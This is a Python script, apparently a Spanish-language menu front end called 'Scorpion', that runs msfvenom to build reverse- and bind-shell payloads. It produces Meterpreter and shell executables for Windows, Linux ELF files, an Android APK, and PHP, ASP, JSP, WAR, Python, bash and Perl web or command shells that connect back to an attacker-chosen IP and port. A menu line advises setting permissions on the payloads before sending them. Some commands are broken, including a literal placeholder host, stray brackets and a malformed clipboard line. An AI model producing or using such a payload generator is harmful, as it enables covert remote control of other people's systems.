# importamos las librerías
import os, time, sys, socket
from colorama import Fore, Back

# configuramos las variables principales
name = socket.gethostname()
ipv4 = socket.gethostbyname(name)
contador = 0

# ponemos a punto los colores
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

# creamos la función de 'salir'
def salir():
    os.system('clear')
    print(Fore.RESET + Back.RESET)
    sys.exit()

# creamos la función de 'volver al menú'
def volver_menu():
    os.system('clear')
    title = '''
            .__                             .__                                 
___  ______ |  |___  __ ___________  _____  |  |     _____   ____   ____  __ __ 
\  \/ /  _ \|  |\  \/ // __ \_  __ \ \__  \ |  |    /     \_/ __ \ /    \|  |  \
 \   (  <_> )  |_\   /\  ___/|  | \/  / __ \|  |__ |  Y Y  \  ___/|   |  \  |  /
  \_/ \____/|____/\_/  \___  >__|    (____  /____/ |__|_|  /\___  >___|  /____/ 
                           \/             \/             \/     \/     \/       
'''
    print(Fore.RED + Back.RESET + title)

    choice = input(Fore.BLUE + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
    print(Fore.RESET + Back.RESET)
    menu()

# creamos la función de 'ver todos los payloads posibles'
def ver_payloads():
    os.system('clear')
    title = '''
                                         .__                    .___      
___  __ ___________  ___________  ___.__.|  |   _________     __| _/______
\  \/ // __ \_  __ \ \____ \__  \<   |  ||  |  /  _ \__  \   / __ |/  ___/
 \   /\  ___/|  | \/ |  |_> > __ \\___  ||  |_(  <_> ) __ \_/ /_/ |\___ \ 
  \_/  \___  >__|    |   __(____  / ____||____/\____(____  /\____ /____  >
           \/        |__|       \/\/                     \/      \/    \/
'''
    print(Fore.RED + Back.RESET + title)

    print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles')
    print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
    os.system('msfvenom -l payloads')
    print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
    choice = input(Fore.BLUE + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
    print(Fore.RESET + Back.RESET)
    menu()

# creamos la función de 'ERROR'
def error():
    os.system('clear')
    title = '''
  __________________  ___________ 
_/ __ \_  __ \_  __ \/  _ \_  __ \
\  ___/|  | \/|  | \(  <_> )  | \/
 \___  >__|   |__|   \____/|__|   
     \/                           
'''
    print(Fore.RED + Back.RESET + title)

    print(Fore.BLUE + Back.RESET + '[>] Error: Command not found\n')
    choice = input(Fore.BLUE + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
    print(Fore.RESET + Back.RESET)
    menu()

# creamos la función de 'windows'
def windows():
    os.system('clear')
    title = '''
        .__            .___                                        .__                    .___      
__  _  _|__| ____    __| _/______  _  ________ ___________  ___.__.|  |   _________     __| _/______
\ \/ \/ /  |/    \  / __ |/  _ \ \/ \/ /  ___/ \____ \__  \<   |  ||  |  /  _ \__  \   / __ |/  ___/
 \     /|  |   |  \/ /_/ (  <_> )     /\___ \  |  |_> > __ \\___  ||  |_(  <_> ) __ \_/ /_/ |\___ \ 
  \/\_/ |__|___|  /\____ |\____/ \/\_//____  > |   __(____  / ____||____/\____(____  /\____ /____  >
                \/      \/                 \/  |__|       \/\/                     \/      \/    \/
'''
    print(Fore.RED + Back.RESET + title + '\n')
    

# creamos la función de 'linux'
def linux():
    os.system('clear')
    title = '''
.__  .__                                          .__                    .___      
|  | |__| ____  __ _____  ___ ___________  ___.__.|  |   _________     __| _/______
|  | |  |/    \|  |  \  \/  / \____ \__  \<   |  ||  |  /  _ \__  \   / __ |/  ___/
|  |_|  |   |  \  |  />    <  |  |_> > __ \\___  ||  |_(  <_> ) __ \_/ /_/ |\___ \ 
|____/__|___|  /____//__/\_ \ |   __(____  / ____||____/\____(____  /\____ /____  >
             \/            \/ |__|       \/\/                     \/      \/    \/ 
'''
    print(Fore.RED + Back.RESET + title + '\n')


# creamos la función de 'android'
def android():
    os.system('clear')
    title = '''
                   .___             .__    .___                     .__                    .___      
_____    ____    __| _/______  ____ |__| __| _/ ___________  ___.__.|  |   _________     __| _/______
\__  \  /    \  / __ |\_  __ \/  _ \|  |/ __ |  \____ \__  \<   |  ||  |  /  _ \__  \   / __ |/  ___/
 / __ \|   |  \/ /_/ | |  | \(  <_> )  / /_/ |  |  |_> > __ \\___  ||  |_(  <_> ) __ \_/ /_/ |\___ \ 
(____  /___|  /\____ | |__|   \____/|__\____ |  |   __(____  / ____||____/\____(____  /\____ /____  >
     \/     \/      \/                      \/  |__|       \/\/                     \/      \/    \/ 
'''
    print(Fore.RED + Back.RESET + title)


# hacemos el menú
def menu():
    os.system('clear')
    time.sleep(1)

    title = f'''
                 ......                                         
               .+*+:.             [ 🅢 🅒 🅞 🅡 🅟 🅘 🅞 🅝 ] -----------------------------                         
              .-##.                                           
             .*#*.                [!] By 3xpl017: https://www.github.com/3xpl017                   
            .+%*..                [>] Scorpion v1: Payload generator with MsfVenom
            :#*-.                                            
            -##=                  [!] Utiliza este software con propósitos éticos                       
            :%#=.                 [>] Ip: {ipv4}
            .*@%.                 [>] Nombre de la máquina: {name}                   
            .#%%:     =+=..                                 
            .:=*#**#=--:. ..+.-:+**=.                           
        -=:-:.-#***++===:.--.=+=*+-.                         
        .=. .:+##%*##**++++==-.**-.-++:.                      
    .:==. :*+=..+%#######*=====+-*=--+=.:---:...             
    ....  .+=. :*###%#**#@@%#*#@#+#:.++***+@#+===-.           
        ..*: :*...-**%%%%@%%@%%%@%##%#+:...-+#*++=..         
        .=-...=+. .=++*++***#%%@%===:..    ....=+*#-.         
            .-=.  :++====+*+==:......         :***-.          
            .... .*%#**###*+-...            .......           
                .#*####%%%%%####*+:.                         
                    .:+###%%@%##%#*=:.                          
                    .........                                
    '''
    print(Fore.RED + Back.RESET + title)

    options = '''
    [00] Salir
    [01] Empezar a generar payloads con MsfVenom
    '''
    print(Fore.BLUE + Back.RESET + options)

    choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

    if choice == '00':
        salir()

    elif choice == '01':
        os.system('clear')
        time.sleep(1)
        options = '''
    [!] Es aconsejable darle permisos a los payloads antes de enviarlos con chmod.
    [00] Salir
    [01] Volver al menú
    [02] Ver la lista de payloads disponibles
    [03] Generar payloads para Windows
    [04] Generar payloads para Linux
    [05] Generar payloads para Android
    [06] Generar payloads en diferentes lenguajes
    '''
        print(Fore.BLUE + Back.RESET + options)
        choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

        if choice == '00':
            salir()

        elif choice == '01':
            volver_menu()

        elif choice == '02':
            ver_payloads()

        elif choice == '03':
            os.system('clear')
            options = '''
[00] Salir
[01] Volver al menú
[02] Ver todos los payloads posibles para Windows
[03] Generar payloads para Windows
'''
            print(Fore.BLUE + Back.RESET + options)

            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

            if choice == '00':
                salir()

            elif choice == '01':
                volver_menu()

            elif choice == '02':
                windows()

                print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles para Windows')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                os.system('msfvenom -l payloads | grep windows')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                choice = input(Fore.BLUE + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '03':
                contador = 0
                windows()

                port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
                ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
                archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
                os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > {archivo}_{contador}.exe')
                contador += 1
                os.system(f'msfvenom -p windows/meterpreter/reverse_http LHOST={ip} LPORT={port} HttpUserAgent="Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > {archivo}_{contador}.exe')
                contador += 1
                os.system(f'msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe > {archivo}_{contador}.exe')
                contador += 1
                os.system(f'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > {archivo}_{contador}.exe')
                contador = 0
                print('\n[>] Payloads generados en tu directorio actual.')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            else:
                error()

        elif choice == '04':
            os.system('clear')
            options = '''
[00] Salir
[01] Volver al menú
[02] Ver todos los payloads posibles
[03] Generar payloads para Linux
'''
            print(Fore.BLUE + Back.RESET + options)

            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

            if choice == '00':
                salir()

            elif choice == '01':
                volver_menu()

            elif choice == '02':
                linux()

                print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles para Linux')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                os.system('msfvenom -l payloads | grep linux')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                choice = input(Fore.BLUE + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '03':
                contador = 0
                linux()

                port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
                ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
                ip_remota = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa la IP remota]: ')
                archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
                os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={ip_remota} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x64/shell_bind_tcp RHOST={ip_remota} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador += 1
                os.system(f'msfvenom -p linux/x64/shell_reverse_tcp RHOST={ip_remota} LPORT={port} -f elf > {archivo}_{contador}.elf')
                contador = 0
                print('\n[>] Payloads generados en tu directorio actual.')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            else:
                error()

        elif choice == '05':
            os.system('clear')
            options = '''
[00] Salir
[01] Volver al menú
[02] Ver todos los payloads posibles
[03] Generar payloads para Android
'''
            print(Fore.BLUE + Back.RESET + options)

            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ ')

            if choice == '00':
                salir()

            elif choice == '01':
                volver_menu()

            elif choice == '02':
                android()

                print(Fore.BLUE + Back.RESET + '[>] Todos los payloads posibles para Android')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                os.system('msfvenom -l payloads | grep android')
                print(Fore.BLUE + Back.RESET + '--------------------------------------------------------------------------------------------------------------')
                choice = input(Fore.BLUE + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            elif choice == '03':
                android()

                port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
                ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')
                archivo = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el nombre de tu payload]: ')
                os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {archivo}.apk')
                print('\n[>] Payload generador en tu directorio actual')
                choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
                print(Fore.RESET + Back.RESET)
                menu()

            else:
                error()


        elif choice == '06':
            os.system('clear')
            port = int(input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa el puerto]: '))
            ip = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Ingresa tu IP]: ')

            os.system(f'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_PHP.php')
            os.system("cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php")

            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f asp > shell_ASP.asp')
            os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell_JSP.jsp')
            os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell_WAR.war')
            os.system(f'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw > shell_PY.py')
            os.system(f'msfvenom -p cmd/unix/reverse_bash LHOST={ip}] LPORT={port}] -f raw > shell_SH.sh')
            os.system(f'msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw > shell_PL.pl')

            print('[>] Payloads generador en tu directorio actual')
            choice = input(Fore.RED + Back.RESET + f'{name}@Scorpion:~$ [Presiona cualquier tecla para volver al menu]: ')
            print(Fore.RESET + Back.RESET)
            menu()

        else:
            error()

    else:
        error()

menu()
